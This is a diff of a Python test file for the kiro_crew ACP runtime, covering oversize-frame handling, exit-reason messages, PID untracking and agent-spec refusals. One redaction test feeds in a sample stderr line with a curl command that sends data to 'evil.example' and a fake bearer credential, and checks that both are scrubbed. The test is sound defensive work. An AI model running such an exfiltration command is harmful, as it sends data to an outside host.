@@ -24,7 +24,9 @@ lines; the subprocess and stdin are mocked (no kiro-cli is launched).
 import asyncio
 import gc
 import json
+import logging
 import os
+import signal
 import time
 import weakref
 from pathlib import Path
@@ -33,6 +35,7 @@ from unittest.mock import AsyncMock, MagicMock, patch
 import pytest
 from spawn_test_helpers import strip_spawn_shim
 
+from kiro_crew.acp import runtime as runtime_mod
 from kiro_crew.acp.client import _OVERSIZE_DRAIN_MAX_BYTES
 from kiro_crew.acp.harness import SessionExtras
 from kiro_crew.acp.runtime import (
@@ -1302,7 +1305,8 @@ async def test_missing_agent_spec_error_reaches_caller_actionable(tmp_path):
     text = str(excinfo.value)
     assert "'kirocrew.json'" in text  # the file that is missing
     assert str(tmp_path) in text  # where it was looked for
-    assert "kirocrew setup --agent-only --clean" in text  # the repair
+    assert "kirocrew setup --agent-only`" in text  # the repair
+    assert "--clean" not in text  # which would drop the operator's own config
     assert "-32603" not in text  # no raw protocol frame
 
 
@@ -1454,6 +1458,145 @@ async def test_oversize_stdout_frame_is_dropped_not_fatal():
         assert not rt._dead
     finally:
         await _stop_reader(task)
+
+
+@pytest.mark.asyncio
+async def test_an_oversize_reply_fails_its_awaited_request_with_the_size_and_limit():
+    """A session/new reply over the frame limit (every agent's welcomeMessage,
+    say) must fail that request at once naming the frame size and the limit --
+    not surface minutes later as a session/new timeout blamed on MCP servers.
+    The reader keeps routing afterwards."""
+    from kiro_crew.acp.session_handle import AcpFrameTooLarge
+
+    rt, _, proc = _make_runtime()
+    reader = asyncio.StreamReader(limit=256)
+    proc.stdout = reader
+    q = _register(rt, "sA")
+    future: asyncio.Future = asyncio.get_running_loop().create_future()
+    rt._pending_requests[7] = future
+    task = await _start_reader(rt)
+    try:
+        frame = b'{"jsonrpc":"2.0","id":7,"result":{"modes":"' + b"W" * 2048 + b'"}}\n'
+        reader.feed_data(frame)
+        with pytest.raises(AcpFrameTooLarge) as excinfo:
+            await asyncio.wait_for(future, timeout=5.0)
+        message = str(excinfo.value)
+        assert f"{len(frame):,} bytes" in message
+        assert f"{runtime_mod._STDOUT_BUFFER_LIMIT:,}-byte" in message
+        assert not getattr(excinfo.value, "transient", False)
+        assert "MCP" not in message
+        assert 7 not in rt._pending_requests
+        _feed(reader, {"method": "session/update", "params": {"sessionId": "sA"}})
+        msg = await asyncio.wait_for(q["sA"].get(), timeout=5.0)
+        assert msg.params["sessionId"] == "sA"
+        assert not rt._dead
+    finally:
+        await _stop_reader(task)
+
+
+@pytest.mark.asyncio
+async def test_an_oversize_host_request_never_fails_one_of_ours():
+    """The host numbers its own requests (a permission prompt) independently, so
+    an oversize frame carrying ``method`` must not fail our request with that id."""
+    rt, _, proc = _make_runtime()
+    reader = asyncio.StreamReader(limit=256)
+    proc.stdout = reader
+    future: asyncio.Future = asyncio.get_running_loop().create_future()
+    rt._pending_requests[3] = future
+    task = await _start_reader(rt)
+    try:
+        reader.feed_data(
+            b'{"jsonrpc":"2.0","id":3,"method":"session/request_permission","params":"'
+            + b"P" * 2048
+            + b'"}\n'
+        )
+        await asyncio.sleep(0.2)
+        assert not future.done()
+        assert 3 in rt._pending_requests
+    finally:
+        future.cancel()
+        await _stop_reader(task)
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("path", ["create", "load"])
+async def test_an_oversize_session_start_reply_is_a_tagged_start_failure(monkeypatch, path):
+    """A self-driving caller counts start failures by ``session_start_failed`` to back
+    off; an oversize session/new or session/load reply is one, and it is not
+    transient -- the same request gets the same reply."""
+    from kiro_crew.acp.session_handle import AcpFrameTooLarge
+
+    rt, _, _ = _make_runtime()
+    rt._can_load_session = True
+
+    async def _oversize(method, params, timeout=None):
+        if method in (METHOD_SESSION_NEW, METHOD_SESSION_LOAD):
+            raise AcpFrameTooLarge(runtime_mod._oversize_frame_message(11_000_000))
+        return {}
+
+    monkeypatch.setattr(rt, "_send_and_await", _oversize)
+    with pytest.raises(AcpFrameTooLarge) as excinfo:
+        if path == "create":
+            await rt.create_session(cwd="/work", agent="kirocrew")
+        else:
+            await rt.load_session(
+                "/home/u/.kiro/sessions/cli/sid-1.json", "sid-1", cwd="/work", agent="kirocrew"
+            )
+    assert excinfo.value.session_start_failed is True
+    assert excinfo.value.transient is False
+    from kiro_crew.llm_helpers import acp_error_is_transient
+
+    assert acp_error_is_transient(excinfo.value) is False
+
+
+@pytest.mark.asyncio
+async def test_an_oversize_session_new_reply_releases_its_start_permit(monkeypatch):
+    """The start gate admits a few session starts at once and has no reaper, so a
+    start that fails on an oversize reply must give its slot back -- otherwise two
+    such failures block every later ``create_session`` on the loop."""
+    from kiro_crew.acp import runtime_start
+    from kiro_crew.acp.session_handle import AcpFrameTooLarge
+
+    released: list[str] = []
+    recorded: list[bool] = []
+    real_acquire = runtime_mod.SessionStartGate.acquire
+
+    async def acquire(self, *a, **k):
+        permit = await real_acquire(self, *a, **k)
+        original = permit.release
+
+        def release():
+            released.append("x")
+            return original()
+
+        permit.release = release
+        return permit
+
+    monkeypatch.setattr(runtime_mod.SessionStartGate, "acquire", acquire)
+    monkeypatch.setattr(
+        runtime_start, "_record_session_start", lambda *_a, ok, **_k: recorded.append(ok)
+    )
+    rt, _, _ = _make_runtime()
+
+    async def _oversize(method, params, timeout=None):
+        if method == METHOD_SESSION_NEW:
+            raise AcpFrameTooLarge(runtime_mod._oversize_frame_message(11_000_000))
+        return {}
+
+    monkeypatch.setattr(rt, "_send_and_await", _oversize)
+    with pytest.raises(AcpFrameTooLarge):
+        await rt.create_session(cwd="/work", agent="kirocrew")
+    assert released == ["x"]
+    assert recorded == [False]
+
+
+def test_the_oversize_frame_id_is_read_only_from_a_reply_envelope():
+    rid = runtime_mod._oversize_frame_request_id
+    assert rid(b'{"jsonrpc":"2.0","id":12,"result":{') == 12
+    assert rid(b'{"jsonrpc":"2.0","result":{"availableModes":[{"id":"kiro_default"}') is None
+    assert rid(b'{"jsonrpc":"2.0","id":4,"method":"session/request_permission"') is None
+    assert rid(b"XXXX") is None
+    assert rid(b'{"jsonrpc":"2.0","result":{"x":{"id":5,"y":1}}') is None
 
 
 @pytest.mark.asyncio
@@ -2733,7 +2876,15 @@ async def test_reader_crash_on_a_running_child_does_not_print_returncode_none(ca
 
 
 @pytest.mark.asyncio
-async def test_exit_reason_appends_last_nonempty_stderr_line():
+async def test_exit_reason_does_not_promote_the_last_stderr_line_to_a_cause():
+    """A child's last word is not why it died.
+
+    ``Error: failed to create sandbox dir`` describes no death -- it is whatever
+    the child happened to flush last -- so the reason stays the exit status and
+    the line is kept at debug. Pasting such a line as the cause is what puts
+    ``HTTP 404 Not Found`` on the card of a death that was in fact an ordinary
+    SIGTERM teardown.
+    """
     rt, reader, proc = _make_runtime()
     proc.returncode = 1
     rt._stderr_lines = ["warming up", "Error: failed to create sandbox dir", "   "]
@@ -2747,9 +2898,27 @@ async def test_exit_reason_appends_last_nonempty_stderr_line():
     finally:
         await _stop_reader(task)
     msg = str(ei.value)
-    assert msg.startswith("process exited (rc=1): Error: failed to create sandbox dir")
+    assert msg == "process exited (rc=1)"
+    assert "sandbox dir" not in msg
     assert "warming up" not in msg
     assert "kirocrew doctor" not in msg
+
+
+def test_exit_reason_names_the_signal_that_ended_the_child():
+    """A negative returncode is POSIX's ``-signum``, and the number alone is the
+    part an operator has to look up -- while ``signal SIGTERM`` says plainly that
+    something ASKED the process to stop, which is what the fleet's deaths were."""
+    rt, _reader, _proc = _make_runtime()
+    assert rt._exit_reason(-15) == "process exited (rc=-15 (signal SIGTERM))"
+    # SIGKILL is POSIX only; see the same reasoning in
+    # test_runtime_death_is_a_process_event.py::test_signal_death_names_its_signal.
+    # Windows cannot name signal 9 and its negative returncodes are not signums,
+    # so the number alone is correct there rather than a name it never delivered.
+    if hasattr(signal, "SIGKILL"):
+        assert rt._exit_reason(-9) == "process exited (rc=-9 (signal SIGKILL))"
+    else:
+        assert rt._exit_reason(-9) == "process exited (rc=-9)"
+    assert rt._exit_reason(1) == "process exited (rc=1)"
 
 
 def test_exit_reason_without_stderr_is_unchanged():
@@ -2770,42 +2939,71 @@ def test_exit_reason_enospc_points_at_doctor():
     assert "kirocrew doctor" in rt._exit_reason(1)
 
 
-def test_exit_reason_redacts_credentials_and_exfil_urls_in_the_tail():
+def test_exit_reason_finds_a_signature_that_is_not_the_last_line():
+    """Which line a child flushed last is a race with its own buffering, so the
+    signature is searched over the whole retained tail."""
+    rt, _reader, _proc = _make_runtime()
+    rt._stderr_lines = [
+        "mkdir: cannot create directory: No space left on device",
+        "shutting down",
+    ]
+    assert "kirocrew doctor" in rt._exit_reason(1)
+
+
+def test_exit_reason_redacts_credentials_and_exfil_urls_in_a_proven_cause():
+    """Redaction is unconditional and lands BEFORE the cut, so a long line
+    cannot leave a secret's first half in the shown prefix. Asserted on a line
+    that DOES earn the cause slot, since that is the text the card carries."""
     import kiro_crew.acp.runtime as rt_mod
 
     rt, _reader, _proc = _make_runtime()
     payload = "A" * 80
     rt._stderr_lines = [
-        f"auth failed: curl https://evil.example/collect?data={payload} "
+        f"No space left on device: curl https://evil.example/collect?data={payload} "
         "Authorization: Bearer AKIAIOSFODNN7EXAMPLE",
     ]
     msg = rt._exit_reason(1)
     assert "AKIAIOSFODNN7EXAMPLE" not in msg
     assert payload not in msg
-    assert "auth failed" in msg
-    # The cut lands AFTER redaction, so a long line cannot leave a secret's
-    # first half in the shown prefix.
-    rt._stderr_lines = ["x" * (rt_mod._STDERR_REASON_TAIL_CHARS - 4) + " AKIAIOSFODNN7EXAMPLE"]
+    assert "No space left on device" in msg
+    rt._stderr_lines = [
+        "No space left on device "
+        + "x" * (rt_mod._STDERR_REASON_TAIL_CHARS - 4)
+        + " AKIAIOSFODNN7EXAMPLE"
+    ]
     assert "AKIAIOSFODNN7" not in rt._exit_reason(1)
 
 
-def test_exit_reason_tail_is_bounded_to_one_line():
+def test_exit_reason_redacts_the_demoted_tail_too(caplog):
+    """The debug log is a real sink, so the line demoted to it is redacted on
+    the same pass -- a secret must not survive by being merely unpromoted."""
+    rt, _reader, _proc = _make_runtime()
+    with caplog.at_level(logging.DEBUG, logger="kiro_crew.acp.runtime"):
+        rt._stderr_lines = ["boom Authorization: Bearer AKIAIOSFODNN7EXAMPLE"]
+        rt._exit_reason(1)
+    assert "exit stderr tail" in caplog.text
+    assert "AKIAIOSFODNN7EXAMPLE" not in caplog.text
+
+
+def test_exit_reason_cause_is_bounded_to_one_line():
     from kiro_crew.acp import runtime as rt_mod
 
     assert rt_mod._STDERR_REASON_TAIL_CHARS == 200
     rt, _reader, _proc = _make_runtime()
-    rt._stderr_lines = ["x" * (rt_mod._STDERR_REASON_TAIL_CHARS * 4)]
+    lead = "No space left on device "
+    rt._stderr_lines = [lead + "x" * (rt_mod._STDERR_REASON_TAIL_CHARS * 4)]
     msg = rt._exit_reason(1)
-    assert len(msg) < rt_mod._STDERR_REASON_TAIL_CHARS + 64
-    assert msg.endswith("…")
+    assert "…" in msg
+    assert len(msg) < rt_mod._STDERR_REASON_TAIL_CHARS + len(rt_mod._ENOSPC_HINT) + 80
     # Exactly at the cap nothing is cut.
-    rt._stderr_lines = ["y" * rt_mod._STDERR_REASON_TAIL_CHARS]
-    assert not rt._exit_reason(1).endswith("…")
+    rt._stderr_lines = [lead.ljust(rt_mod._STDERR_REASON_TAIL_CHARS, "y")]
+    assert "…" not in rt._exit_reason(1)
 
 
 def test_exit_reason_enospc_hint_survives_the_tail_cap():
-    """The signature is matched on the whole line: a marker past the cap
-    still points at the doctor even though the card shows only the head."""
+    """The signature is matched on the whole line and the HINT is appended after
+    the cut, so a line long enough to be trimmed cannot push the operator's
+    pointer out of the message that pointer is the whole purpose of."""
     from kiro_crew.acp import runtime as rt_mod
 
     rt, _reader, _proc = _make_runtime()
@@ -5930,6 +6128,71 @@ class TestAcpRuntimePidTracking:
 
         assert calls["pid"] == [4242]
         assert calls["session"] == [4242]
+
+    @pytest.mark.asyncio
+    async def test_kill_retires_by_identity_when_a_spawn_token_is_held(self, monkeypatch):
+        """The reap proved THIS process dead, not that its number is still ours:
+        a root spawned since can already hold it. So the kill path retires the
+        line that names this process (the token read at spawn), never the lines
+        that merely carry the number."""
+        rt, _, proc = _make_runtime()
+        proc.wait = AsyncMock(return_value=0)
+        rt._spawn_start_token = "tok-a"
+
+        import kiro_crew.acp.runtime as rt_mod
+
+        if rt_mod.platform_compat.IS_WINDOWS:
+            pytest.skip("the Windows owned drain retires under its pin; covered separately")
+        identity_calls: list[tuple[int, str]] = []
+
+        def _by_identity(pid, token):
+            identity_calls.append((pid, token))
+            return True
+
+        def _never(*_a):
+            raise AssertionError("prefix-matched untrack ran although a token was held")
+
+        monkeypatch.setattr(rt_mod, "_untrack_root_by_identity", _by_identity)
+        monkeypatch.setattr(rt_mod, "_untrack_pid", _never)
+        monkeypatch.setattr(rt_mod, "_untrack_session_pid", _never)
+        monkeypatch.setattr(rt_mod, "_untrack_pid_if_dead", _never)
+        monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda pid: False)
+        monkeypatch.setattr(rt_mod.platform_compat, "kill_process_tree", lambda *a: None)
+
+        await rt.kill()
+
+        assert identity_calls == [(4242, "tok-a")]
+
+    @pytest.mark.asyncio
+    async def test_kill_clears_the_bare_line_only_while_dead_when_no_session_line_was_ours(
+        self, monkeypatch
+    ):
+        """Identity retirement found no line of ours (spawn's append failed, or a
+        successor already replaced it). The bare line still goes -- but through
+        the probe-under-lock helper, never by number alone."""
+        rt, _, proc = _make_runtime()
+        proc.wait = AsyncMock(return_value=0)
+        rt._spawn_start_token = "tok-a"
+
+        import kiro_crew.acp.runtime as rt_mod
+
+        if rt_mod.platform_compat.IS_WINDOWS:
+            pytest.skip("the Windows owned drain retires under its pin; covered separately")
+        if_dead_calls: list[int] = []
+
+        def _never(*_a):
+            raise AssertionError("prefix-matched untrack ran although a token was held")
+
+        monkeypatch.setattr(rt_mod, "_untrack_root_by_identity", lambda pid, token: False)
+        monkeypatch.setattr(rt_mod, "_untrack_pid_if_dead", lambda pid: if_dead_calls.append(pid))
+        monkeypatch.setattr(rt_mod, "_untrack_pid", _never)
+        monkeypatch.setattr(rt_mod, "_untrack_session_pid", _never)
+        monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda pid: False)
+        monkeypatch.setattr(rt_mod.platform_compat, "kill_process_tree", lambda *a: None)
+
+        await rt.kill()
+
+        assert if_dead_calls == [4242]
 
     @pytest.mark.asyncio
     async def test_kill_keeps_pid_tracked_when_the_process_survives(self, monkeypatch):
@@ -9176,12 +9439,43 @@ async def test_create_session_fails_closed_when_agent_not_advertised():
     # session/new response, then the terminate roundtrip from the fail-closed path
     rt._send_and_await = AsyncMock(side_effect=[resp, {}])  # type: ignore[method-assign]
     with patch.object(AcpSessionHandle, "drain_init", AsyncMock()):
-        with pytest.raises(AcpRuntimeError, match="not available"):
+        with pytest.raises(AcpRuntimeError, match="not available") as exc:
             await rt.create_session(agent="kirocrew", mcp_servers=[])
+    # An ordinary agent keeps the materialize hint: setup does write that file.
+    assert "kirocrew setup --agent-only" in str(exc.value)
     methods = [c.args[0] for c in rt._send_and_await.call_args_list]
     assert METHOD_SET_MODE not in methods  # never activated the wrong mode
     assert METHOD_SESSION_TERMINATE in methods  # created session cleaned up
     assert "s1" not in rt._session_queues  # unregistered
+
+
+@pytest.mark.asyncio
+async def test_create_session_refusal_explains_a_derived_readonly_spec(tmp_path, monkeypatch):
+    """The side turn's ``<agent>--readonly`` spec is written by the side turn,
+    never by ``kirocrew setup``, and kiro-cli lists agents only at process start.
+    The refusal must say that and name the base agent -- the setup hint sent the
+    user to a command that cannot create the file. The spec is published by the
+    real publisher, because the owner marker on it is what the wording keys on."""
+    from kiro_crew import agent as agent_mod
+    from kiro_crew.dashboard import side_readonly_spec as srs
+
+    monkeypatch.setattr(agent_mod, "KIRO_AGENTS_DIR", tmp_path)
+    monkeypatch.setattr(srs, "_refresh_materialized_snapshot", lambda: None)
+    (tmp_path / "scout.json").write_text(json.dumps({"name": "scout"}), encoding="utf-8")
+    assert srs.publish_readonly_spec("scout").name == "scout--readonly"
+    rt, _, _ = _make_runtime()
+    rt._finish_session_init = MagicMock(return_value=[])  # type: ignore[method-assign]
+    resp = _new_resp({"currentModeId": "kirocrew", "availableModes": [{"id": "kirocrew"}]})
+    rt._send_and_await = AsyncMock(side_effect=[resp, {}])  # type: ignore[method-assign]
+    with patch.object(AcpSessionHandle, "drain_init", AsyncMock()):
+        with pytest.raises(AcpRuntimeError, match="not available") as exc:
+            await rt.create_session(agent="scout--readonly", mcp_servers=[])
+    message = str(exc.value)
+    assert "kirocrew setup --agent-only" not in message
+    assert "is likely missing" not in message
+    assert "read-only spec Kiro Crew derives from 'scout'" in message
+    assert "name 'scout'" in message
+    assert "Refusing to run the backend default mode kirocrew in its place" in message
 
 
 @pytest.mark.asyncio
